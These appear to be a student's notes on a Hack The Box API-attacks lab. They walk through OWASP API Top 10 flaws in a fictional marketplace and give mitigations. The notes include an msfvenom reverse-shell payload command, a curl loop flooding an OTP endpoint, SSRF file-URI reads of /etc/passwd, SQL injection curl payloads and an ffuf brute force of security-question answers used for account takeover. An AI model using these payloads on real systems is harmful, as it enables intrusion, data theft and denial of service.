![POST request for uploading "certificateOfIncorporation.pdf". Company ID provided. Response: Success status true, file URI, file size 31457280 bytes.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/268/API4_2023_Unrestricted_Resource_Consumption_Image_5.png)

Because the endpoint does not validate whether the file size is within a specified range, the backend will save files of any size to disk. Additionally, if the endpoint does not implement rate-limiting, we can attempt to cause a denial-of-service by sending the file upload request repeatedly, consuming all available disk storage. Exploiting this vulnerability to consume all the disk storage of the marketplace will result in financial losses for the stakeholders of `Inlanefreight E-Commerce Marketplace`

---

### 2. Unrestricted File Upload

Additionally, we need to test whether the endpoint allows uploading files other than PDF files. Lets msfvenom to create an exe reverse shell

```bash
$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe -o reverse.exe
```

After invoking the endpoint, we notice that the API returns a successful upload message, indicating that the endpoint does not validate the file extension (additionally, notice how the files are stored within `wwwroot/SupplierCompaniesCertificatesOfIncorporations`):

![Screenshot_2026-03-25_00_02_20.png](/HTB/Web_Penetration_Tester/API_Attacks/Images/9dabca3d-90d9-463f-9e45-d2dbcca61f3f.png)

```json
{
  "successStatus": true,
  "fileURI": "file:///app/wwwroot/SupplierCompaniesCertificatesOfIncorporations/reverse.exe",
  "fileSize": 7168
}
```

If we manage to social engineer a system administrator of `Inlanefreight E-Commerce Marketplace` to open the file, the executable will run, potentially granting us a reverse shell 

---

### 3. **Abusing Default Behaviors**

After each request to upload files, we noticed that the file URI points to `wwwroot/SupplierCompaniesCertificatesOfIncorporations`, which is within the `wwwroot` directory.

The admin of `Inlanefreight E-Commerce Marketplace` has informed us that the web API is developed using [ASP.NET Core](https://dotnet.microsoft.com/en-us/apps/aspnet). By default, static files in the `wwwroot` directory are [publicly accessible](https://learn.microsoft.com/en-us/aspnet/core/fundamentals/static-files?view=aspnetcore-8.0#security-considerations-for-static-files). Let us try to download the previously uploaded `exe` file:

![Screenshot_2026-03-29_12_02_01.png](/HTB/Web_Penetration_Tester/API_Attacks/Images/8c9c8675-b527-4614-9778-db9a4d30d683.png)

If we can enumerate file names within the `SupplierCompaniesCertificatesOfIncorporations` directory (and other directories within `wwwroot`), we could potentially access sensitive information about other customers of `Inlanefreight E-Commerce Marketplace`. Additionally, we could utilize the web API as cloud storage for malware that could be distributed to victims.

```bash
ffuf -u http://154.57.164.76:32051/SupplierCompaniesCertificatesOfIncorporations/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .exe,.php,.txt,.zip,.bak -H "Authorization: Bearer ey..."
```

### Prevention

To mitigate **Unrestricted Resource Consumption** and **Malicious File Upload** vulnerabilities, the report recommends a multi-layered defense strategy for the `/api/v1/supplier-companies/certificates-of-incorporation` endpoint:

**1. Strict Input Validation**

- **File Size Limits:** Implement maximum size thresholds to prevent "denial of service" by exhausting disk space or memory.
- **Extension White-listing:** Restrict uploads to safe formats (e.g., PDF, JPG) and strictly block executables (`.exe`, `.bat`, `.sh`).
- **Content Validation:** Perform server-side checks to ensure the file's internal structure matches its declared extension.

**2. Active Threat Detection**

- **Antivirus Integration:** Use tools like **ClamAV** to scan all uploads for malware signatures before they are saved to the server's storage.

**3. Access & Environment Control**

- **Authentication & Authorization:** Ensure only verified users with specific permissions can initiate uploads.
- **Directory Security:** Secure publicly accessible folders (like `wwwroot`) to prevent unauthorized users from accessing or executing uploaded files.

### Challenge

**Exploit another Unrestricted Resource Consumption vulnerability and submit the flag.**

```bash
for i in {1..15}; do
curl -X POST "http://154.57.164.76:32051/api/v1/authentication/customers/passwords/resets/sms-otps" -d '{"Email": "htbpentester4@hackthebox.com"}' -H 'Content-Type: application/json'     
done
```

## API-5: Broken Function Level Authorization

A web API is vulnerable to `Broken Function Level Authorization` (`BFLA`) if it allows unauthorized or unprivileged users to interact with and invoke privileged endpoints, granting access to sensitive operations or confidential information. The difference between `BOLA` and `BFLA` is that, in the case of `BOLA`, the user is authorized to interact with the vulnerable endpoint, whereas in the case of `BFLA`, the user is not.

---

### 1. Exposure of Sensitive Information to an Unauthorized Actor

The endpoint we will be practicing against is vulnerable to [CWE-200: Exposure of Sensitive Information to an Unauthorized Actor](https://cwe.mitre.org/data/definitions/200.html).

**Scenario:** The admin of `Inlanefreight E-Commerce Marketplace` has provided us with the credentials `htbpentester9@hackthebox.com:HTBPentester9`, wanting us to assess what API vulnerabilities the user can exploit with their assigned roles.

After invoking `/api/v1/authentication/customer/sign-in` to sign in as a customer and obtain a JWT. The roles the user has: 

```json
{
  "errorMessage": "User does not have any roles assigned"
}
```

Now we need to hunt for endpoints that require authorization but allow **unauthorized users** to 
interact with them. One interesting endpoint under the Products group, `/api/v1/products/discounts`, seems to retrieve all product discounts, however, it requires authenticated users to have the  `ProductDiscounts_GetAll` role. 

Despite not having any roles, if we attempt to invoke the `/api/v1/products/discounts` endpoint, we notice that it returns data containing all the discounts for products:

![Screenshot_2026-03-29_12_27_13.png](/HTB/Web_Penetration_Tester/API_Attacks/Images/18612a1d-5c4f-40ef-85f8-85bfb9c58740.png)

Although the web API developers intended that only authorized users with the `ProductDiscounts_GetAll` role could access this endpoint, they did not implement the role-based access control check.

### Prevention

To mitigate the `BFLA` vulnerability, the `/api/v1/products/discounts` endpoint should enforce an authorization check at the source-code level to ensure that only users with the `ProductDiscounts_GetAll` role can interact with it. This involves verifying the user's roles 
before processing the request, ensuring that unauthorized users are denied access to the endpoint's functionality.

### Challenge

**Exploit another Broken Function Level Authorization vulnerability and submit the flag.**

we can also view this endpoint even with a role-based access control check

```json
/api/v1/customers/billing-addresses
```

## API-6: **Unrestricted Access to Sensitive Business Flows**

All businesses operate to generate revenue; however, if a web API exposes operations or data that allows users to abuse them and undermine the system (for example, by buying goods at a discounted price), it becomes vulnerable to `Unrestricted Access to Sensitive Business Flows`. An API endpoint is vulnerable if it exposes a sensitive business flow without appropriately restricting access to it.

## Scenario

In the previous section, we exploited a `BFLA` vulnerability and gained access to product discount data. This data exposure also leads to `Unrestricted Access to Sensitive Business Flows`
 because it allows us to know the dates when supplier companies will discount their products and the corresponding discount rates. For example, if we want to buy the product with ID `a923b706-0aaa-49b2-ad8d-21c97ff6fac7`, we should purchase it between `2023-03-15` and `2023-09-15` because it will be 70% off its original price:

![GET request for /api/v1/products/discounts. Response: Product discounts with product ID, rate percentage 70, start date "2023-03-15", and end date "2023-09-15".](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/268/API6_2023_Unrestricted_Access_to_Sensitive_Business_Flows_Image_1.png)

Additionally, if the endpoint responsible for purchasing products does not implement rate-limiting (i.e., it suffers from `Unrestricted Resource Consumption`),we can purchase all available stock on the day the discount starts and resell the products later at their original price or at a higher price 
after the discount ends.

### Prevention

To mitigate the `Unrestricted Access to Sensitive Business Flows` vulnerability, endpoints exposing critical business operations, such as `/api/v1/products/discounts`, should implement strict access controls to ensure that only authorized users can view or interact with sensitive data.

## API-7: Server-Side Request Forgery

A web API is vulnerable to `Server-Side Request Forgery` (`SSRF`) (also known as `Cross-Site Port Attack` (`XPSA`)) if it uses user-controlled input to fetch remote or local resources 
without validation. SSRF flaws occur when an API fetches a remote resource without validating the user-supplied URL. This allows an attacker to coerce the application to send a crafted request to an unexpected destination (especially local ones), bypassing firewalls or 
VPNs.

## Server-Side Request Forgery (SSRF)

The endpoint we will be practicing against is vulnerable to [CWE-918: Server-Side Request Forgery (SSRF)](https://cwe.mitre.org/data/definitions/918.html).

Roles:

```json
{
  "roles": [
    "SupplierCompanies_Update",
    "SupplierCompanies_UploadCertificateOfIncorporation"
  ]
}
```

Checking the Supplier-Companies group, we notice that there are three endpoints related to these roles, 

- `/api/v1/supplier-companies`,
- `/api/v1/supplier-companies/{ID}/certificates-of-incorporation`, and
- `/api/v1/supplier-companies/certificates-of-incorporation`

`/api/v1/supplier-companies/current-user` shows that the currently authenticated user belongs to the supplier-company with the ID

```json
{
  "supplierCompany": {
    "id": "b75a7c76-e149-4ca7-9c55-d9fc4ffa87be",
    "name": "PentesterCompany",
    "email": "supplier@pentestercompany.com",
    "isExemptedFromMarketplaceFee": 0,
    "certificateOfIncorporationPDFFileURI": "CompanyDidNotUploadYet"
  }
}
```

---

### 1. Testing `SupplierCompanies_UploadCertificateOfIncorporation` Role

on the endpoint `/api/v1/supplier-companies/certificates-of-incorporation` it requires the `SupplierCompanies_UploadCertificateOfIncorporation` role and allows the staff of a supplier-company to upload its certificate of incorporation as a PDF file

![Screenshot_2026-03-29_13_44_10.png](/HTB/Web_Penetration_Tester/API_Attacks/Images/d743c12a-7a1f-456d-b64d-4d6417bbe4ed.png)

After invoking the endpoint, we will notice that the response contains three fields, with the most interesting being the value of `fileURI`:

```json
{
  "successStatus": true,
  "fileURI": "file:///app/wwwroot/SupplierCompaniesCertificatesOfIncorporations/test.pdf",
  "fileSize": 15
}
```

The web API stores the path of files using the [file URI Scheme](https://datatracker.ietf.org/doc/html/rfc8089), which is used to represent local file paths and allows access to files on a local filesystem. If we use the `/api/v1/supplier-companies/current-user` endpoint again, we will notice that the value of `certificateOfIncorporationPDFFileURI` now has the file URI of the uploaded file:

```json
{
  "supplierCompany": {
    "id": "b75a7c76-e149-4ca7-9c55-d9fc4ffa87be",
    "name": "PentesterCompany",
    "email": "supplier@pentestercompany.com",
    "isExemptedFromMarketplaceFee": 0,
    "certificateOfIncorporationPDFFileURI": "file:///app/wwwroot/SupplierCompaniesCertificatesOfIncorporations/test.pdf"
  }
}
```

---

### 2. Testing `SupplierCompanies_Update` Role

Expanding the `/api/v1/supplier-companies` `PATCH` endpoint, we notice that it requires the `SupplierCompanies_Update` role, that the update must be performed by staff belonging to the 
Supplier-Company, and that it allows modifying the value of the `CertificateOfIncorporationPDFFileURI` field:

![Screenshot_2026-03-29_13_50_44.png](/HTB/Web_Penetration_Tester/API_Attacks/Images/4401b293-6129-44c4-b1aa-573439f067a7.png)

Therefore, this endpoint is vulnerable to `Improperly Controlled Modification of Dynamically-Determined Object Attributes`, as the value of this field should only be set by the `/api/v1/supplier-companies/certificates-of-incorporation` `POST` endpoint. Let us perform an SSRF attack and update the `CertificateOfIncorporationPDFFileURI` field to point to the `/etc/passwd` file:

![Screenshot_2026-03-29_13_56_07.png](/HTB/Web_Penetration_Tester/API_Attacks/Images/8458073e-c9ed-4add-908c-166e198fe7de.png)

After updating the certification, we can check it by sending a request to `api/v1/supplier-companies/current-user`

![Screenshot_2026-03-29_13_55_42.png](/HTB/Web_Penetration_Tester/API_Attacks/Images/e5a71576-9df9-44ad-9f81-ca90becaedf5.png)

Because the web API's backend does not validate the path that the `CertificateOfIncorporationPDFFileURI` field points to, it will fetch and return the contents of local files, including sensitive ones such as `/etc/passwd`

Let us invoke the `/api/v1/supplier-companies/{ID}/certificates-of-incorporation` `GET` endpoint to retrieve the contents of the file that `CertificateOfIncorporationPDFFileURI` points to, which is `/etc/passwd`, as base64:

![Screenshot_2026-03-29_14_01_38.png](/HTB/Web_Penetration_Tester/API_Attacks/Images/ac1bcf66-9cd8-4144-bb61-940dc96fef40.png)

We can further compromise the system by viewing the contents of other critical files, such as `/etc/shadow`.

### Prevention

To mitigate the `SSRF` vulnerability, the `/api/v1/supplier-companies/certificates-of-incorporation` `POST` and `/api/v1/supplier-companies` `PATCH` endpoints must strictly prohibit file URIs that point to local resources on the server other than the intended ones. Implementing 
validation checks to ensure that file URIs only point to permissible local resources is crucial, which in this case is within the `wwwroot/SupplierCompaniesCertificatesOfIncorporations/` folder.

Furthermore, the `/api/v1/supplier-companies/{ID}/certificates-of-incorporation` `GET` endpoint must be configured to serve content exclusively from the designated folder `wwwroot/SupplierCompaniesCertificatesOfIncorporations`. This ensures that only certificates of incorporation are accessible and that local resources or files outside this directory are never exposed. Additionally, this acts as a safeguard, if in case the validations performed by the `/api/v1/supplier-companies/certificates-of-incorporation` `POST` and `/api/v1/supplier-companies` `PATCH` endpoints fail.

### Challenge

**Exploit another Server Side Request Forgery vulnerability and submit the contents of the file '/etc/flag.conf'.** 

Roles we have:

```json
{
  "roles": [
    "SupplierCompanies_Update",
    "SupplierCompanies_UploadCertificateOfIncorporation",
    "Products_CreateByCurrentUser",
    "Products_Update",
    "Products_UploadPhoto"
  ]
}
```

`/api/v1/suppliers/current-user` to fetch the current user data

```json
{
  "supplier": {
    "id": "5d489453-3538-4973-9479-2c37b2a5db73",
    "companyID": "b75a7c76-e149-4ca7-9c55-d9fc4ffa87be",
    "name": "HTBPentester11",
    "email": "htbpentester11@pentestercompany.com",
    "phoneNumber": "+44 9998 999992"
  }
}
```

we still dont have any product ID to test with, so from this endpoint `/api/v1/products/current-user` create a new product and leave the `PNGPhotoFileURI` field empty because we haven't uploaded any photo yet

![Screenshot_2026-03-29_14_21_47.png](/HTB/Web_Penetration_Tester/API_Attacks/Images/772d2efb-7e25-4d69-8d4a-1303a0024154.png)

```json
{
  "successStatus": true,
  "productID": "5b748d96-3a90-426d-8587-531079c22594"
}
```

`/api/v1/products/photo` to upload a photo

![Screenshot_2026-03-29_14_26_48.png](/HTB/Web_Penetration_Tester/API_Attacks/Images/eeef2db4-02f4-4184-bc72-61bf0b3612f2.png)

`/api/v1/products/{ID}` get a product by ID

![Screenshot_2026-03-29_14_29_59.png](/HTB/Web_Penetration_Tester/API_Attacks/Images/b2a8b332-9331-40b1-9cbf-be697c523aa2.png)

We can see now that after uploading the product photo, it was updated to the product field.

`PATCH /api/v1/products` Here is where the vulnerability is: from this endpoint, we can update the product photo to point to the local file system 

![Screenshot_2026-03-29_14_31_58.png](/HTB/Web_Penetration_Tester/API_Attacks/Images/36c09bfd-9636-4ba1-a4ec-7bc4c1cb84c1.png)

Fetch the file content from this endpoint `/api/v1/products/{ID}/photo`

![Screenshot_2026-03-29_14_33_19.png](/HTB/Web_Penetration_Tester/API_Attacks/Images/c771fa80-ef37-4d4d-838d-90a1e33c2654.png)

## API-8: **Security Misconfiguration**

Web APIs are susceptible to the same security misconfigurations that can compromise traditional web applications. One typical example is a web API endpoint that accepts user-controlled input and incorporates it into SQL queries without proper validation, thereby allowing [Injection](https://owasp.org/Top10/A03_2021-Injection/) attacks.

### Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

The endpoint we will be practicing against is vulnerable to [CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')](https://cwe.mitre.org/data/definitions/89.html).

---

### 1. SQL Injection

Roles: 

```json
{
  "roles": [
    "Products_GetProductsTotalCountByNameSubstring"
  ]
}
```

endpint:

- `/api/v1/products/{Name}/count`

it returns the total count of products containing a user-provided substring in their name:

For example, if we use `laptop` as the `Name` substring parameter, we find that there are 18 matching products in total:

![Swagger UI showing a GET request to /api/v1/products/{Name}/count with the name "laptop" to get the total count of products. Requires role Products_GetProductsTotalCountByNameSubstring. Response code 200 with productsCount: 18.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/268/API8_2023_Security_Misconfiguration_Image_3.png)

However, if we try using `laptop'` (with a trailing apostrophe) as input, we observe that the endpoint returns an error message, indicating a potential vulnerability to SQL injection attacks:

```bash
$ curl -X 'GET' \
  'http://154.57.164.81:30610/api/v1/products/laptop%27/count' \
  -H 'accept: application/json' \
  -H 'Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjEyQHBlbnRlc3RlcmNvbXBhbnkuY29tIiwiaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93cy8yMDA4LzA2L2lkZW50aXR5L2NsYWltcy9yb2xlIjoiUHJvZHVjdHNfR2V0UHJvZHVjdHNUb3RhbENvdW50QnlOYW1lU3Vic3RyaW5nIiwiZXhwIjoxNzc0Nzg2NTI5LCJpc3MiOiJodHRwOi8vYXBpLmlubGFuZWZyZWlnaHQuaHRiIiwiYXVkIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiJ9.3unwqiOcUKu13wO4c4fnzfIJPRgsuSvJ_f7JMRqCCp2op4_zf7lBlxAjZyCpR47kkGij4XeYTR2hN0tIAkQCDQ'
{"errorMessage":"An error has occurred!"} 
```

Let us attempt to retrieve the count of all records in the Products table using the payload `laptop' OR 1=1 --`

```bash
$ curl -X 'GET' \
  'http://154.57.164.81:30610/api/v1/products/laptop%27OR%201%3D1%20--/count' \
  -H 'accept: application/json' \
  -H 'Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjEyQHBlbnRlc3RlcmNvbXBhbnkuY29tIiwiaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93cy8yMDA4LzA2L2lkZW50aXR5L2NsYWltcy9yb2xlIjoiUHJvZHVjdHNfR2V0UHJvZHVjdHNUb3RhbENvdW50QnlOYW1lU3Vic3RyaW5nIiwiZXhwIjoxNzc0Nzg2NTI5LCJpc3MiOiJodHRwOi8vYXBpLmlubGFuZWZyZWlnaHQuaHRiIiwiYXVkIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiJ9.3unwqiOcUKu13wO4c4fnzfIJPRgsuSvJ_f7JMRqCCp2op4_zf7lBlxAjZyCpR47kkGij4XeYTR2hN0tIAkQCDQ'
{"productsCount":720}  
```

---

### 2. HTTP headers

APIs can also suffer from security misconfigurations if they do not use proper [HTTP Security Response Headers](https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Headers_Cheat_Sheet.html). For example, suppose an API does not set a secure [Access-Control-Allow-Origin](https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Headers_Cheat_Sheet.html#access-control-allow-origin) as part of its `CORS` (`Cross-Origin Resource Sharing`) policy. In that case, it can be exposed to security risks, most notably, [Cross-Site Request Forgery](https://cwe.mitre.org/data/definitions/352.html) (`CSRF`).

---

### Prevention

To mitigate the `Security Misconfiguration` vulnerability, the `/api/v1/products/{Name}/count` endpoint should utilize parameterized queries or an [Object Relational Mapper](https://en.wikipedia.org/wiki/Object%E2%80%93relational_mapping) (`ORM`) to safely insert user-controlled values into SQL queries. If that is not a choice, it must validate user-controlled input before concatenating it into the SQL query, which is never infallible.

Furthermore, if the web API is using HTTP headers insecurely or omits security-related ones, it should implement secure headers to prevent various security vulnerabilities from occurring. Projects like [OWASP Secure Headers](https://github.com/OWASP/www-project-secure-headers) provide guidance on HTTP security headers and how to avoid security  vulnerabilities associated with improper header configurations.

## API-9: **Improper Inventory Management**

Maintaining accurate and up-to-date documentation is essential for web APIs, especially 
considering their reliance on third-party users who need to understand how to interact with the API effectively.

However, as a web API matures and undergoes changes, it is crucial to implement proper versioning practices to avoid security pitfalls. Improper inventory management of APIs, including inadequate versioning, can introduce security misconfigurations and increase the attack surface. This can manifest in various ways, such as outdated or incompatible API versions remaining accessible, creating potential entry points for unauthorized users.

### Scenario

In the previous sections, we have primarily interacted with `v1` of the `Inlanefreight E-Commerce Marketplace` web API. However, upon examining the `Swagger` UI's drop-down list for 'Select a definition', we discover the existence of an additional version, `v0`:

![Swagger UI for Inlanefreight E-Commerce Marketplace API. Version v1 selected, option to switch to v0. Sections include Authentication, Customers, Products, Roles, Supplier-Companies, and Suppliers.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/268/API9_2023_Improper_Inventory_Management_Image_1.png)

Upon reviewing the description of `v0`, it is indicated that this version contains legacy and deleted data, serving as an unmaintained backup that should be removed. However, upon inspecting the endpoints, we will notice that none of them display a 'lock' icon, indicating that they do not require any form of authentication:

Upon invoking the `/api/v0/customers/deleted` endpoint, the API responds by exposing deleted customer data, including sensitive password hashes:

![Swagger UI showing a GET request to /api/v0/customers/deleted. Response code 200 with deleted customer details: ID, name, email, phone number, birth date, and password hash for multiple entries.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/268/API9_2023_Improper_Inventory_Management_Image_3.png)

Due to oversight by the developers in neglecting to remove the `v0` endpoints, we gained unauthorized access to deleted data of former customers. This issue was exacerbated by an `Excessive Data Exposure` vulnerability in the `/api/v0/customers/deleted` endpoint, which allowed us to view customer password hashes. With this exposed information, we could attempt password cracking. Given the common practice of password reuse, this could potentially compromise active accounts, particularly if the same customers re-registered using the same password.

### Prevention

Effectiveversioning ensures that only the intended API versions are exposed to users, with older versions properly deprecated or sunset. By thoroughly managing the API inventory, `Inlanefreight E-Commerce Marketplace` can minimize the risk of exposing vulnerabilities and maintain a secure user interface.

To mitigate the `Improper Inventory Management` vulnerability, developers at `Inlanefreight E-Commerce Marketplace` should either remove `v0` entirely or, at a minimum, restrict access exclusively for local development and testing purposes, ensuring it remains inaccessible to 
external users. If neither option is viable, the endpoints should be protected with stringent authentication measures, permitting interaction solely by administrators.

# API-10: Unsafe Consumption of APIs

APIs frequently interact with other APIs to exchange data, forming a complex ecosystem of interconnected services. While this interconnectivity enhances functionality and efficiency, it also introduces significant security risks if not managed properly. Developers may blindly trust data received from third-party APIs, especially when provided by reputable organizations, leading to relaxed security measures, particularly in input validation and data sanitization. Several critical vulnerabilities can arise from API-to-API communication:

1. `Insecure Data Transmission`: APIs communicating over unencrypted channels expose sensitive data to
interception, compromising confidentiality and integrity.
2. `Inadequate Data Validation`: Failing to properly validate and sanitize data received from external
APIs before processing or forwarding it to downstream components can
lead to injection attacks, data corruption, or even remote code
execution.
3. `Weak Authentication`: Neglecting to implement robust authentication methods when
communicating with other APIs can result in unauthorized access to
sensitive data or critical functionality.
4. `Insufficient Rate-Limiting`: An API can overwhelm another API by sending a continuous surge of requests, potentially leading to denial-of-service.
5. `Inadequate Monitoring`: Insufficient monitoring of API-to-API interactions can make it difficult to detect and respond to security incidents promptly.

If an API consumes another API insecurely, it is vulnerable to [CWE-1357: Reliance on Insufficiently Trustworthy Component](https://cwe.mitre.org/data/definitions/1357.html).

## Prevention

To prevent vulnerabilities arising from API-to-API communication, web API developers should implement the following measures:

- `Secure Data Transmission`: Use encrypted channels for data transmission to prevent exposure of sensitive data through man-in-the-middle attacks.
- `Adequate Data Validation`: Ensure proper validation and sanitization of data received from
external APIs before processing or forwarding it to downstream
components. This mitigates risks such as injection attacks, data
corruption, or remote code execution.
- `Robust Authentication`: Employ secure authentication methods when communicating with other APIs to prevent unauthorized access to sensitive data or critical
functionality.
- `Sufficient Rate-Limiting`: Implement rate-limiting mechanisms to prevent an API from overwhelming
another API, thereby protecting against denial-of-service attacks.
- `Adequate Monitoring`: Implement robust monitoring of API-to-API interactions to promptly detect and respond to security incidents.

# Skills Assessment

## Scenario

After reporting all vulnerabilities in versions v0 and v1 of `Inlanefreight E-Commerce Marketplace`, the admin attempted to patch all of them in v2:

However, new junior developers have implemented additional functionalities in v2, and the admin is concerned that they may have introduced new vulnerabilities. Assess the security of the new web API version and apply everything you have learned throughout the module to compromise it.

In the Authentication group, I noticed a new feature which is → `/api/v2/authentication/suppliers/passwords/resets/security-question-answers`

![Screenshot_2026-03-29_21_19_51.png](/HTB/Web_Penetration_Tester/API_Attacks/Images/ac471353-099e-4d46-832d-333d2e85d9bc.png)

This feature, resets suppliers password based on security question answers, and since we don’t have a supplier email, I checked the roles, and it turned out that we can view all the suppliers’ details, including their security question  

```json
{
  "roles": [
    "Suppliers_Get",
    "Suppliers_GetAll"
  ]
}
```

`/api/v2/suppliers` require `Suppliers_GetAll` authorization: 

![Screenshot_2026-03-29_21_25_10.png](/HTB/Web_Penetration_Tester/API_Attacks/Images/9cbba041-1527-4d55-9e3a-f2c20946de44.png)

As seen, some of the suppliers didn't add security question, but a few did 

```json
{
      "id": "b87017cd-c720-43a3-acbe-46bfbfd6e4aa",
      "companyID": "f9e58492-b594-4d82-a4de-16e4f230fce1",
      "name": "Luca Walker",
      "email": "L.Walker1872@globalsolutions.com",
      "securityQuestion": "What is your favorite color?",
      "professionalCVPDFFileURI": "SupplierDidNotUploadYet"
    },
```

However, the answers aren't shown, so we will just guess. I downloaded the color list from here [https://gist.githubusercontent.com/mordka/c65affdefccb7264efff77b836b5e717/raw/e65646a07849665b28a7ee641e5846a1a6a4a758/colors-list.txt](https://gist.githubusercontent.com/mordka/c65affdefccb7264efff77b836b5e717/raw/e65646a07849665b28a7ee641e5846a1a6a4a758/colors-list.txt) and collected the emails that added the security question in a file

```bash
$ ffuf -u "http://154.57.164.73:32186/api/v2/authentication/suppliers/passwords/resets/security-question-answers" -H 'Content-Type: application/json' -d '{"SupplierEmail": "EMAIL","SecurityQuestionAnswer": "COLOR","NewPassword": "string"}' -w colors-list.txt:COLOR -w emails.txt:EMAIL -replay-proxy '<http://127.0.0.1:8080>' -fr "false"

[Status: 200, Size: 22, Words: 1, Lines: 1, Duration: 506ms]
    * COLOR: rust
    * EMAIL: B.Rogers1535@globalsolutions.com
```

After signing in as a supplier, this is the authorization I get

```json
{
  "errorMessage": "User does not have any roles assigned"
}
```

current supplier details

```json
{
  "supplier": {
    "id": "36f17195-395f-443e-93a4-8ceee81c6106",
    "companyID": "f9e58492-b594-4d82-a4de-16e4f230fce1",
    "name": "Brandon Rogers",
    "email": "B.Rogers1535@globalsolutions.com",
    "securityQuestion": "What is your favorite color?",
    "professionalCVPDFFileURI": "SupplierDidNotUploadYet"
  }
}
```

Note in the **professionalCVPDFFileURI** field, we can upload a CV from this endpoint `POST /api/v2/suppliers/current-user/cv`

```json
{
  "successStatus": true,
  "fileURI": "file:///app/wwwroot/SupplierCVs/test.pdf",
  "fileSize": 15
}
```

Also, we can fetch the content from this endpoint `GET /api/v2/suppliers/current-user/cv`. Now let's test if we can update the current supplier details and change the `ProfessionalCVPDFFileURI` to point to a local file from this endpoint `PATCH  /api/v2/suppliers/current-user/cv`

```bash
$ curl -X 'PATCH' \\
  '<http://154.57.164.73:32186/api/v2/suppliers/current-user>' \\
  -H 'accept: application/json' \\
  -H 'Authorization: Bearer ...' \\
  -H 'Content-Type: application/json' \\
  -d '{
  "SecurityQuestion": "What is your favorite color?",
  "SecurityQuestionAnswer": "red",
  "ProfessionalCVPDFFileURI": "file:///etc/passwd",
  "PhoneNumber": "8788888",
  "Password": "string1"
}'

{
  "SuccessStatus": true
}
```

fetch the content from `GET /api/v2/suppliers/current-user/cv`, it seems we don't have read permission on this file

```json
{
  "successStatus": false,
  "base64Data": "An error occurred while reading the file."
}
```

but it did work when i attempt to read flag.txt file